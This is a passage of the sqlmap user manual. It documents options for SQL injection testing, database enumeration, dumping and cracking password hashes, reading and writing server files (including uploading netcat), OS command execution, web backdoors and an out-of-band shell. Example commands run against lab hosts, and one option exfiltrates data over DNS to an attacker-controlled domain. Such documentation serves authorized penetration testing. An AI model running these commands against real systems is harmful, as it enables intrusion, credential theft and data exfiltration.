time-based blind SQL injection</h3><br />Option: <code>--time-sec</code><br />It is possible to set the seconds to delay the response when testing for time-based blind SQL injection, by providing the <code>--time-sec</code> option followed by an integer. By default it&#39;s value is set to <strong>5 seconds</strong>.<br /><br /><br /><br /><h3>Number of columns in UNION query SQL injection</h3><br />Option: <code>--union-cols</code><br />By default sqlmap tests for UNION query SQL injection technique using  1 to 10 columns. However, this range can be increased up to 50 columns  by providing an higher <code>--level</code> value. See the relevant paragraph for more details.<br />You can manually tell sqlmap to test for this type of SQL injection  with a specific range of columns by providing the tool with the option <code>--union-cols</code> followed by a range of integers. For instance, <code>12-16</code> means tests for UNION query SQL injection by using 12 up to 16 columns.<br /><br /><br /><br /><h3>Character to use to test for UNION query SQL injection</h3><br />Option: <code>--union-char</code><br />By default sqlmap tests for UNION query SQL injection technique using <code>NULL</code> character. However, by providing a higher <code>--level</code> value sqlmap will performs tests also with a random number because there are some corner cases where UNION query tests with <code>NULL</code> fail, whereas with a random integer they succeed.<br />You can manually tell sqlmap to test for this type of SQL injection with a specific character by using option <code>--union-char</code> with desired character value (e.g. <code>--union-char 123</code>).<br /><br /><br /><br /><h3>Table to use in FROM part of UNION query SQL injection</h3><br />Option: <code>--union-from</code><br />In some UNION query SQL injection cases there is a need to enforce the usage of valid and accessible table name in <code>FROM</code>  clause. For example, Microsoft Access requires usage of such table.  Without providing one UNION query SQL injection won&#39;t be able to perform  correctly (e.g. <code>--union-from=users</code>).<br /><br /><br /><br /><h3>DNS exfiltration attack</h3><br />Option: <code>--dns-domain</code><br />DNS exfiltration SQL injection attack is described in paper <a href="http://arxiv.org/pdf/1303.3047.pdf">Data Retrieval over DNS in SQL Injection Attacks</a>, while presentation of it&#39;s implementation inside sqlmap can be found in slides <a href="http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281">DNS exfiltration using sqlmap</a>.<br />If user is controlling a machine registered as a DNS domain server (e.g. domain <code>attacker.com</code>) he can turn on this attack by using this option (e.g. <code>--dns-domain attacker.com</code>). Prerequisites for it to work is to run a sqlmap with <code>Administrator</code> privileges (usage of privileged port <code>53</code>)  and that one normal (blind) technique is available for exploitation.  That&#39;s solely the purpose of this attack is to speed up the process of  data retrieval in case that at least one technique has been identified  (in best case time-based blind). In case that error-based blind or UNION  query techniques are available it will be skipped as those are  preferred ones by default.<br /><br /><br /><br /><h3>Second-order attack</h3><br />Options: <code>--second-url</code> and <code>--second-req</code><br />Second-order SQL injection attack is an attack where result(s) of an  injected payload in one vulnerable page is shown (reflected) at the  other (e.g. frame). Usually that&#39;s happening because of database storage  of user provided input at the original vulnerable page.<br />You can manually tell sqlmap to test for this type of SQL injection by using option <code>--second-order</code> with the URL address or <code>--second-req</code> with request file for sending to the server where results are being shown.<br /><br /><br /><br /><h2>Fingerprint</h2><br /><br /><br /><br /><h3>Extensive database management system fingerprint</h3><br />Switches: <code>-f</code> or <code>--fingerprint</code><br />By default the web application&#39;s back-end database management system  fingerprint is handled automatically by sqlmap. Just after the detection  phase finishes and the user is eventually prompted with a choice of  which vulnerable parameter to use further on, sqlmap fingerprints the  back-end database management system and continues on with the injection  by knowing which SQL syntax, dialect and queries to use to proceed with  the attack within the limits of the database architecture.<br />If for any instance you want to perform an extensive database  management system fingerprint based on various techniques like specific  SQL dialects and inband error messages, you can provide the switch <code>--fingerprint</code>.  sqlmap will perform a lot more requests and fingerprint the exact DBMS  version and, where possible, operating system, architecture and patch  level.<br />If you want the fingerprint to be even more accurate result, you can also provide the switch <code>-b</code> or <code>--banner</code>.<br /><br /><br /><br /><h2>Enumeration</h2><br />These options can be used to enumerate the back-end database  management system information, structure and data contained in the  tables. Moreover you can run your own SQL statements.<br /><br /><br /><br /><h3>Retrieve all</h3><br />Switch: <code>--all</code><br />This switch can be used in situations where user wants to retrieve  everything remotely accessible by using a single switch. This is not  recommended as it will generate large number of requests retrieving both  useful and unuseful data.<br /><br /><br /><br /><h3>Banner</h3><br />Switch: <code>-b</code> or <code>--banner</code><br />Most of the modern database management systems have a function and/or   an environment variable which returns the database management system  version and eventually details on its patch level, the underlying  system. Usually the function is <code>version()</code> and the environment variable is <code>@@version</code>, but this vary depending on the target DBMS.<br />Example against an Oracle target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/oracle/get_int.php?id=1&quot; -\<br />-banner<br /><br />[...]<br />[xx:xx:11] [INFO] fetching banner<br />web application technology: PHP 5.2.6, Apache 2.2.9<br />back-end DBMS: Oracle<br />banner:    &#39;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#39;<br /></code><br /><br /><br /><br /><h3>Session user</h3><br />Switch: <code>--current-user</code><br />With this switch it is possible to retrieve the database management  system&#39;s user which is effectively performing the query against the  back-end DBMS from the web application.<br /><br /><br /><br /><h3>Current database</h3><br />Switch: <code>--current-db</code><br />With this switch it is possible to retrieve the database management  system&#39;s database name that the web application is connected to.<br /><br /><br /><br /><h3>Server hostname</h3><br />Switch: <code>--hostname</code><br />With this switch it is possible to retrieve the database management system&#39;s hostname.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\<br />hostname<br /><br />[...]<br />[xx:xx:04] [INFO] fetching server hostname<br />[xx:xx:04] [INFO] retrieved: debian-5.0-i386<br />hostname:    &#39;debian-5.0-i386&#39;<br /></code><br /><br /><br /><br /><h3>Detect whether or not the session user is a database administrator</h3><br />Switch: <code>--is-dba</code><br />It is possible to detect if the current database management system  session user is a database administrator, also known as DBA. sqlmap will  return <code>True</code> if it is, vice versa <code>False</code>.<br /><br /><br /><br /><h3>List database management system users</h3><br />Switch: <code>--users</code><br />When the session user has read access to the system table containing  information about the DBMS users, it is possible to enumerate the list  of users.<br /><br /><br /><br /><h3>List and crack database management system users password hashes</h3><br />Switch: <code>--passwords</code><br />When the session user has read access to the system table containing  information about the DBMS users&#39; passwords, it is possible to enumerate  the password hashes for each database management system user. sqlmap  will first enumerate the users, then the different password hashes for  each of them.<br />Example against a PostgreSQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --\<br />passwords -v 1<br /><br />[...]<br />back-end DBMS: PostgreSQL<br />[hh:mm:38] [INFO] fetching database users password hashes<br />do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y<br />[hh:mm:42] [INFO] using hash method: &#39;postgres_passwd&#39;<br />what&#39;s the dictionary&#39;s location? [/software/sqlmap/txt/wordlist.txt] <br />[hh:mm:46] [INFO] loading dictionary from: &#39;/software/sqlmap/txt/wordlist.txt&#39;<br />do you want to use common password suffixes? (slow!) [y/N] n<br />[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)<br />[hh:mm:49] [INFO] found: &#39;testpass&#39; for user: &#39;testuser&#39;<br />[hh:mm:50] [INFO] found: &#39;testpass&#39; for user: &#39;postgres&#39;<br />database management system users password hashes:<br />[*] postgres [1]:<br />    password hash: md5d7d880f96044b72d0bba108ace96d1e4<br />    clear-text password: testpass<br />[*] testuser [1]:<br />    password hash: md599e5ea7a6f7c3269995cba3927fd0093<br />    clear-text password: testpass<br /></code><br />Not only sqlmap enumerated the DBMS users and their passwords, but it  also recognized the hash format to be PostgreSQL, asked the user  whether or not to test the hashes against a dictionary file and  identified the clear-text password for the <code>postgres</code> user, which is usually a DBA along the other user, <code>testuser</code>, password.<br />This feature has been implemented for all DBMS where it is possible  to enumerate users&#39; password hashes, including Oracle and Microsoft SQL  Server pre and post 2005.<br />You can also provide the option <code>-U</code> to specify the specific user who you want to enumerate and eventually crack the password hash(es). If you provide <code>CU</code> as username it will consider it as an alias for current user and will retrieve the password hash(es) for this user.<br /><br /><br /><br /><h3>List database management system users privileges</h3><br />Switch: <code>--privileges</code><br />When the session user has read access to the system table containing  information about the DBMS users, it is possible to enumerate the  privileges for each database management system user. By the privileges,  sqlmap will also show you which are database administrators.<br />You can also provide the option <code>-U</code> to specify the user who you want to enumerate the privileges.<br />If you provide <code>CU</code> as username it will consider it as an alias for current user and will enumerate the privileges for this user.<br />On Microsoft SQL Server, this feature will display you whether or not  each user is a database administrator rather than the list of  privileges for all users.<br /><br /><br /><br /><h3>List database management system users roles</h3><br />Switch: <code>--roles</code><br />When the session user has read access to the system table containing  information about the DBMS users, it is possible to enumerate the roles  for each database management system user.<br />You can also provide the option <code>-U</code> to specify the user who you want to enumerate the privileges.<br />If you provide <code>CU</code> as username it will consider it as an alias for current user and will enumerate the privileges for this user.<br />This feature is only available when the DBMS is Oracle.<br /><br /><br /><br /><h3>List database management system&#39;s databases</h3><br />Switch: <code>--dbs</code><br />When the session user has read access to the system table containing  information about available databases, it is possible to enumerate the  list of databases.<br /><br /><br /><br /><h3>Enumerate database&#39;s tables</h3><br />Switches and option: <code>--tables</code>, <code>--exclude-sysdbs</code> and <code>-D</code><br />When the session user has read access to the system table containing  information about databases&#39; tables, it is possible to enumerate the  list of tables for a specific database management system&#39;s databases.<br />If you do not provide a specific database with option <code>-D</code>, sqlmap will enumerate the tables for all DBMS databases.<br />You can also provide the switch <code>--exclude-sysdbs</code> to exclude all system databases.<br />Note that on Oracle you have to provide the <code>TABLESPACE_NAME</code> instead of the database name.<br /><br /><br /><br /><h3>Enumerate database table columns</h3><br />Switch and options: <code>--columns</code>, <code>-C</code>, <code>-T</code> and <code>-D</code><br />When the session user has read access to the system table containing  information about database&#39;s tables, it is possible to enumerate the  list of columns for a specific database table. sqlmap also enumerates  the data-type for each column.<br />This feature depends on option <code>-T</code> to specify the table name and optionally on <code>-D</code>  to specify the database name. When the database name is not specified,  the current database name is used. You can also provide the <code>-C</code> option to specify the table columns name like the one you provided to be enumerated.<br />Example against a SQLite target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; -\<br />-columns -D testdb -T users -C name<br />[...]<br />Database: SQLite_masterdb<br />Table: users<br />[3 columns]<br />+---------+---------+<br />| Column  | Type    |<br />+---------+---------+<br />| id      | INTEGER |<br />| name    | TEXT    |<br />| surname | TEXT    |<br />+---------+---------+<br /></code><br />Note that on PostgreSQL you have to provide <code>public</code> or  the name of a system database. That&#39;s because it is not possible to  enumerate  other databases tables, only the tables under the schema that  the web application&#39;s user is connected to, which is always aliased by <code>public</code>.<br /><br /><br /><br /><h3>Enumerate database management system schema</h3><br />Switches: <code>--schema</code> and <code>--exclude-sysdbs</code><br />User can retrieve a DBMS schema by using this switch. Schema listing  will contain all databases, tables and columns, together with their  respective types. In combination with <code>--exclude-sysdbs</code> only part of the schema containing non-system databases will be retrieved and shown.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot; --s\<br />chema--batch --exclude-sysdbs<br /><br />[...]<br />Database: owasp10<br />Table: accounts<br />[4 columns]<br />+-------------+---------+<br />| Column      | Type    |<br />+-------------+---------+<br />| cid         | int(11) |<br />| mysignature | text    |<br />| password    | text    |<br />| username    | text    |<br />+-------------+---------+<br /><br />Database: owasp10<br />Table: blogs_table<br />[4 columns]<br />+--------------+----------+<br />| Column       | Type     |<br />+--------------+----------+<br />| date         | datetime |<br />| blogger_name | text     |<br />| cid          | int(11)  |<br />| comment      | text     |<br />+--------------+----------+<br /><br />Database: owasp10<br />Table: hitlog<br />[6 columns]<br />+----------+----------+<br />| Column   | Type     |<br />+----------+----------+<br />| date     | datetime |<br />| browser  | text     |<br />| cid      | int(11)  |<br />| hostname | text     |<br />| ip       | text     |<br />| referer  | text     |<br />+----------+----------+<br /><br />Database: testdb<br />Table: users<br />[3 columns]<br />+---------+---------------+<br />| Column  | Type          |<br />+---------+---------------+<br />| id      | int(11)       |<br />| name    | varchar(500)  |<br />| surname | varchar(1000) |<br />+---------+---------------+<br />[...]<br /></code><br /><br /><br /><br /><h3>Retrieve number of entries for table(s)</h3><br />Switch: <code>--count</code><br />In case that user wants just to know the number of entries in table(s) prior to dumping the desired one, he can use this switch.<br />Example against a Microsoft SQL Server target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\<br /> --count -D testdb<br />[...]<br />Database: testdb<br />+----------------+---------+<br />| Table          | Entries |<br />+----------------+---------+<br />| dbo.users      | 4       |<br />| dbo.users_blob | 2       |<br />+----------------+---------+<br /></code><br /><br /><br /><br /><h3>Dump database table entries</h3><br />Switch and options: <code>--dump</code>, <code>-C</code>, <code>-T</code>, <code>-D</code>, <code>--start</code>, <code>--stop</code>, <code>--first</code>, <code>--last</code>, <code>--pivot-column</code> and <code>--where</code><br />When the session user has read access to a specific database&#39;s table it is possible to dump the table entries.<br />This functionality depends on option <code>-T</code> to specify the table name and optionally on option <code>-D</code> to specify the database name. If the table name is provided, but the database name is not, the current database name is used.<br />Example against a Firebird target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot;\<br /> --dump -T users<br />[...]<br />Database: Firebird_masterdb<br />Table: USERS<br />[4 entries]<br />+----+--------+------------+<br />| ID | NAME   | SURNAME    |<br />+----+--------+------------+<br />| 1  | luther | blisset    |<br />| 2  | fluffy | bunny      |<br />| 3  | wu     | ming       |<br />| 4  | NULL   | nameisnull |<br />+----+--------+------------+<br /></code><br />This switch can also be used to dump all tables&#39; entries of a  provided database. You simply have to provide sqlmap with the switch <code>--dump</code> along with only the option <code>-D</code> (no <code>-T</code> and no <code>-C</code>).<br />You can also provide a comma-separated list of the specific columns to dump with the option <code>-C</code>.<br />sqlmap also generates for each table dumped the entries in a CSV  format textual file. You can see the absolute path where sqlmap creates  the file by providing a verbosity level greater than or equal to <strong>1</strong>.<br />If you want to dump only a range of entries, then you can provide options <code>--start</code> and/or <code>--stop</code>  to respectively start to dump from a certain entry and stop the dump at  a certain entry. For instance, if you want to dump only the first  entry, provide <code>--stop 1</code> in your command line. Vice versa if, for instance, you want to dump only the second and third entry, provide <code>--start 1</code> <code>--stop 3</code>.<br />It is also possible to specify which single character or range of characters to dump with options <code>--first</code> and <code>--last</code>. For instance, if you want to dump columns&#39; entries from the third to the fifth character, provide <code>--first 3</code> <code>--last 5</code>.  This feature only applies to the blind SQL injection techniques because  for error-based and UNION query SQL injection techniques the number of  requests is exactly the same, regardless of the length of the column&#39;s  entry output to dump.<br />Sometimes (e.g. for Microsoft SQL Server, Sybase and SAP MaxDB) it is  not possible to dump the table rows straightforward by using <code>OFFSET m, n</code> mechanism because of lack of similar. In such cases sqlmap dumps the content by determining the most suitable <code>pivot</code>  column (the one with most unique values) whose values are used later on  for retrieval of other column values. If it is necessary to enforce the  usage of particular <code>pivot</code> column because the automatically chosen one is not suitable (e.g. because of lack of table dump results) you can use option <code>--pivot-column</code> (e.g. <code>--pivot-column=id</code>).<br />In case that you want to constraint the dump to specific column values (or ranges) you can use option <code>--where</code>. Provided logical operation will be automatically used inside the <code>WHERE</code> clause. For example, if you use <code>--where=&quot;id&gt;3&quot;</code> only table rows having value of column <code>id</code> greater than 3 will be retrieved (by appending <code>WHERE id&gt;3</code> to used dumping queries).<br />As you may have noticed by now, sqlmap is <strong>flexible</strong>:  you can leave it to automatically dump the whole database table or you  can be very precise in which characters to dump, from which columns and  which range of entries.<br /><br /><br /><br /><h3>Dump all databases tables entries</h3><br />Switches: <code>--dump-all</code> and <code>--exclude-sysdbs</code><br />It is possible to dump all databases tables entries at once that the session user has read access on.<br />You can also provide the switch <code>--exclude-sysdbs</code> to exclude all system databases. In that case sqlmap will only dump entries of users&#39; databases tables.<br />Note that on Microsoft SQL Server the <code>master</code> database is not considered a system database because some database administrators use it as a users&#39; database.<br /><br /><br /><br /><h3>Search for columns, tables or databases</h3><br />Switch and options: <code>--search</code>, <code>-C</code>, <code>-T</code>, <code>-D</code><br />This switch allows you to <strong>search for specific database names, specific tables across all databases or specific columns across all databases&#39; tables</strong>.<br />This is useful, for instance, to identify tables containing custom  application credentials where relevant columns&#39; names contain string  like <em>name</em> and <em>pass</em>.<br />Switch <code>--search</code> needs to be used in conjunction with one of the following support options:<br />◇ <code>-C</code> following a list of comma-separated column names to look for across the whole database management system.<br />◇ <code>-T</code> following a list of comma-separated table names to look for across the whole database management system.<br />◇ <code>-D</code> following a list of comma-separated database names to look for across the database management system.<br /><br /><br /><br /><br /><h3>Run custom SQL statement</h3><br />Option and switch: <code>--sql-query</code> and <code>--sql-shell</code><br />The SQL query and the SQL shell features allow to run arbitrary SQL  statements on the database management system. sqlmap automatically  dissects the provided statement, determines which technique is  appropriate to use to inject it and how to pack the SQL payload  accordingly.<br />If the query is a <code>SELECT</code> statement, sqlmap will retrieve  its output. Otherwise it will execute the query through the stacked  query SQL injection technique if the web application supports multiple  statements on the back-end database management system. Beware that some  web application technologies do not support stacked queries on specific  database management systems. For instance, PHP does not support stacked  queries when the back-end DBMS is MySQL, but it does support when the  back-end DBMS is PostgreSQL.<br />Examples against a Microsoft SQL Server 2000 target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --\<br />sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1<br /><br />[...]<br />[hh:mm:14] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;&#39;<br />[hh:mm:14] [INFO] retrieved: foo<br />SELECT &#39;foo&#39;:    &#39;foo&#39;<br /><br />$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --\<br />sql-query &quot;SELECT &#39;foo&#39;, &#39;bar&#39;&quot; -v 2<br /><br />[...]<br />[hh:mm:50] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;, &#39;bar&#39;&#39;<br />[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now <br />unpack it into distinct queries to be able to retrieve the output even if we are<br /> going blind<br />[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS <br />VARCHAR(8000)), (CHAR(32)))<br />[hh:mm:50] [INFO] retrieved: foo<br />[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds<br />[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA<br />RCHAR(8000)), (CHAR(32)))<br />[hh:mm:50] [INFO] retrieved: bar<br />[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds<br />SELECT &#39;foo&#39;, &#39;bar&#39;:    &#39;foo, bar&#39;<br /></code><br />As you can see, sqlmap splits the provided query into two different <code>SELECT</code> statements then retrieves the output for each separate query.<br />If the provided query is a <code>SELECT</code> statement and contains a <code>FROM</code>  clause, sqlmap will ask you if such statement can return multiple  entries. In that case the tool knows how to unpack the query correctly  to count the number of possible entries and retrieve its output, entry  per entry.<br />The SQL shell option allows you to run your own SQL statement  interactively, like a SQL console connected to the database management  system. This feature provides TAB completion and history support too.<br /><br /><br /><br /><h2>Brute force</h2><br />These switches can be used to run brute force checks.<br /><br /><br /><br /><h3>Brute force tables names</h3><br />Switch: <code>--common-tables</code><br />There are cases where switch <code>--tables</code> can not be used to retrieve the databases&#39; table names. These cases usually fit into one of the following categories:<br />◇ The database management system is MySQL <strong>&lt; 5.0</strong> where <code>information_schema</code> is not available.<br />◇ The database management system is Microsoft Access and system table <code>MSysObjects</code> is not readable - default setting.<br />◇ The session user does not have read privileges against the system table storing the scheme of the databases.<br /><br />If any of the first two cases apply and you provided the switch <code>--tables</code>,  sqlmap will prompt you with a question to fall back to this technique. Either of these cases apply to your  situation, sqlmap can possibly still identify some existing tables if  you provide it with the switch <code>--common-tables</code>. sqlmap will perform a brute-force attack in order to detect the existence of common tables across the DBMS.<br />The list of common table names is <code>txt/common-tables.txt</code> and you can edit it as you wish.<br />Example against a MySQL 4.1 target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --commo\<br />n-tables -D testdb --banner<br /><br />[...]<br />[hh:mm:39] [INFO] testing MySQL<br />[hh:mm:39] [INFO] confirming MySQL<br />[hh:mm:40] [INFO] the back-end DBMS is MySQL<br />[hh:mm:40] [INFO] fetching banner<br />web server operating system: Windows<br />web application technology: PHP 5.3.1, Apache 2.2.14<br />back-end DBMS operating system: Windows<br />back-end DBMS: MySQL &lt; 5.0.0<br />banner:    &#39;4.1.21-community-nt&#39;<br /><br />[hh:mm:40] [INFO] checking table existence using items from &#39;/software/sqlmap/tx<br />t/common-tables.txt&#39;<br />[hh:mm:40] [INFO] adding words used on web page to the check list<br />please enter number of threads? [Enter for 1 (current)] 8<br />[hh:mm:43] [INFO] retrieved: users<br /><br />Database: testdb<br />[1 table]<br />+-------+<br />| users |<br />+-------+<br /></code><br /><br /><br /><br /><h3>Brute force columns names</h3><br />Switch: <code>--common-columns</code><br />As per tables, there are cases where switch <code>--columns</code> can not be used to retrieve the databases&#39; tables&#39; column names. These cases usually fit into one of the following categories:<br />◇ The database management system is MySQL <strong>&lt; 5.0</strong> where <code>information_schema</code> is not available.<br />◇ The database management system is Microsoft Access where this kind of information is not available inside system tables.<br />◇ The session user does not have read privileges against the system table storing the scheme of the databases.<br /><br />If any of the first two cases apply and you provided the switch <code>--columns</code>,  sqlmap will prompt you with a question to fall back to this technique. Either of these cases apply to your  situation, sqlmap can possibly still identify some existing tables if  you provide it with the switch <code>--common-columns</code>. sqlmap will perform a brute-force attack in order to detect the existence of common columns across the DBMS.<br />The list of common table names is <code>txt/common-columns.txt</code> and you can edit it as you wish.<br /><br /><br /><br /><h2>User-defined function injection</h2><br />These options can be used to create custom user-defined functions.<br /><br /><br /><br /><h3>Inject custom user-defined functions (UDF)</h3><br />Switch and option: <code>--udf-inject</code> and <code>--shared-lib</code><br />You can inject your own user-defined functions (UDFs) by compiling a  MySQL or PostgreSQL shared library, DLL for Windows and shared object  for Linux/Unix, then provide sqlmap with the path where the shared  library is stored locally on your machine. sqlmap will then ask you some  questions, upload the shared library on the database server file  system, create the user-defined function(s) from it and, depending on  your options, execute them. When you are finished using the injected  UDFs, sqlmap can also remove them from the database for you.<br />These techniques are detailed in the white paper <a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857">Advanced SQL injection to operating system full control</a>.<br />Use option <code>--udf-inject</code> and follow the instructions.<br />If you want, you can specify the shared library local file system path via command line too by using <code>--shared-lib</code> option. Vice versa sqlmap will ask you for the path at runtime.<br />This feature is available only when the database management system is MySQL or PostgreSQL.<br /><br /><br /><br /><h2>File system access</h2><br /><br /><br /><br /><h3>Read a file from the database server&#39;s file system</h3><br />Option: <code>--file-read</code><br />It is possible to retrieve the content of files from the underlying  file system when the back-end database management system is either  MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the  needed privileges to abuse database specific functionalities and  architectural weaknesses. The file specified can be either a textual or a  binary file. sqlmap will handle it properly.<br />These techniques are detailed in the white paper <a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857">Advanced SQL injection to operating system full control</a>.<br />Example against a Microsoft SQL Server 2005 target to retrieve a binary file:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?nam\<br />e=luther&quot; --file-read &quot;C:/example.exe&quot; -v 1<br /><br />[...]<br />[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server<br />web server operating system: Windows 2000<br />web application technology: ASP.NET, Microsoft IIS 6.0, ASP<br />back-end DBMS: Microsoft SQL Server 2005<br /><br />[hh:mm:50] [INFO] fetching file: &#39;C:/example.exe&#39;<br />[hh:mm:50] [INFO] the SQL query provided returns 3 entries<br />C:/example.exe file saved to:    &#39;/software/sqlmap/output/192.168.136.129/files/<br />C__example.exe&#39;<br />[...]<br /><br />$ ls -l output/192.168.136.129/files/C__example.exe <br />-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C_<br />_example.exe<br /><br />$ file output/192.168.136.129/files/C__example.exe <br />output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI<br />) Intel 80386 32-bit<br /></code><br /><br /><br /><br /><h3>Upload a file to the database server&#39;s file system</h3><br />Options: <code>--file-write</code> and <code>--file-dest</code><br />It is possible to upload a local file to the database server&#39;s file  system when the back-end database management system is either MySQL,  PostgreSQL or Microsoft SQL Server, and the session user has the needed  privileges to abuse database specific functionalities and architectural  weaknesses. The file specified can be either a textual or a binary file.  sqlmap will handle it properly.<br />These techniques are detailed in the white paper <a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857">Advanced SQL injection to operating system full control</a>.<br />Example against a MySQL target to upload a binary UPX-compressed file:<br /><code>$ file /software/nc.exe.packed <br />/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32<br />-bit<br /><br />$ ls -l /software/nc.exe.packed<br />-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed<br /><br />$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; -\<br />-file-write &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1<br /><br />[...]<br />[hh:mm:29] [INFO] the back-end DBMS is MySQL<br />web server operating system: Windows 2003 or 2008<br />web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727<br />back-end DBMS: MySQL &gt;= 5.0.0<br /><br />[...]<br />do you want confirmation that the file &#39;C:/WINDOWS/Temp/nc.exe&#39; has been success<br />fully written on the back-end DBMS file system? [Y/n] y<br />[hh:mm:52] [INFO] retrieved: 31744<br />[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b<br />ytes, same size as the local file &#39;/software/nc.exe.packed&#39;<br /></code><br /><br /><br /><br /><h2>Operating system takeover</h2><br /><br /><br /><br /><h3>Run arbitrary operating system command</h3><br />Option and switch: <code>--os-cmd</code> and <code>--os-shell</code><br />It is possible to <strong>run arbitrary commands on the database server&#39;s underlying operating system</strong>  when the back-end database management system is either MySQL,  PostgreSQL or Microsoft SQL Server, and the session user has the needed  privileges to abuse database specific functionalities and architectural  weaknesses.<br />On MySQL and PostgreSQL, sqlmap uploads (via the file upload  functionality explained above) a shared library (binary file) containing  two user-defined functions, <code>sys_exec()</code> and <code>sys_eval()</code>,  then it creates these two functions on the database and calls one of  them to execute the specified command, depending on user&#39;s choice to  display the standard output or not. On Microsoft SQL Server, sqlmap  abuses the <code>xp_cmdshell</code> stored procedure: if it is disabled  (by default on Microsoft SQL Server &gt;= 2005), sqlmap re-enables it;  if it does not exist, sqlmap creates it from scratch.<br />When the user requests the standard output, sqlmap uses one of the  enumeration SQL injection techniques (blind, inband or error-based) to  retrieve it. Vice versa, if the standard output is not required, stacked  query SQL injection technique is used to execute the command.<br />These techniques are detailed in the white paper <a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857">Advanced SQL injection to operating system full control</a>.<br />Example against a PostgreSQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --\<br />os-cmd id -v 1<br /><br />[...]<br />web application technology: PHP 5.2.6, Apache 2.2.9<br />back-end DBMS: PostgreSQL<br />[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system<br />[hh:mm:12] [INFO] the back-end DBMS operating system is Linux<br />[hh:mm:12] [INFO] testing if current user is DBA<br />[hh:mm:12] [INFO] detecting back-end DBMS version from its banner<br />[hh:mm:12] [INFO] checking if UDF &#39;sys_eval&#39; already exist<br />[hh:mm:12] [INFO] checking if UDF &#39;sys_exec&#39; already exist<br />[hh:mm:12] [INFO] creating UDF &#39;sys_eval&#39; from the binary UDF file<br />[hh:mm:12] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file<br />do you want to retrieve the command standard output? [Y/n/a] y<br />command standard output:    &#39;uid=104(postgres) gid=106(postgres) groups=106(post<br />gres)&#39;<br /><br />[hh:mm:19] [INFO] cleaning up the database management system<br />do you want to remove UDF &#39;sys_eval&#39;? [Y/n] y<br />do you want to remove UDF &#39;sys_exec&#39;? [Y/n] y<br />[hh:mm:23] [INFO] database management system cleanup finished<br />[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys<br />tem can only be deleted manually<br /></code><br />It is also possible to simulate a real shell where you can type as many arbitrary commands as you wish. The option is <code>--os-shell</code> and has the same TAB completion and history functionalities that <code>--sql-shell</code> has.<br />Where stacked queries has not been identified on the web application  (e.g. PHP or ASP with back-end database management system being MySQL)  and the DBMS is MySQL, it is still possible to abuse the <code>SELECT</code> clause&#39;s <code>INTO OUTFILE</code>  to create a web backdoor in a writable folder within the web server  document root and still get command execution assuming the back-end DBMS  and the web server are hosted on the same server. sqlmap supports this  technique and allows the user to provide a comma-separated list of  possible document root sub-folders where try to upload the web file  stager and the subsequent web backdoor. Also, sqlmap has its own tested  web file stagers and backdoors for the following languages:<br />◇ ASP<br />◇ ASP.NET<br />◇ JSP<br />◇ PHP<br /><br /><br /><br /><br /><h3>Out-of-band stateful connection: Meterpreter &amp; friends</h3><br />Switches and options: <code>--os-pwn</code>, <code>--os-smbrelay</code>, <code>--os-bof</code>, <code>--priv-esc</code>, <code>--msf-path</code> and <code>--tmp-path</code><br />It is possible to establish an <strong>out-of-band stateful TCP connection between the attacker machine and the database server</strong>  underlying operating system when the back-end database management  system is either MySQL, PostgreSQL or Microsoft SQL Server, and the  session user has the needed privileges to abuse database specific  functionalities and architectural weaknesses. This channel can be an  interactive command prompt, a Meterpreter session or a graphical user  interface (VNC) session as per user&#39;s choice.<br />sqlmap relies on Metasploit to create 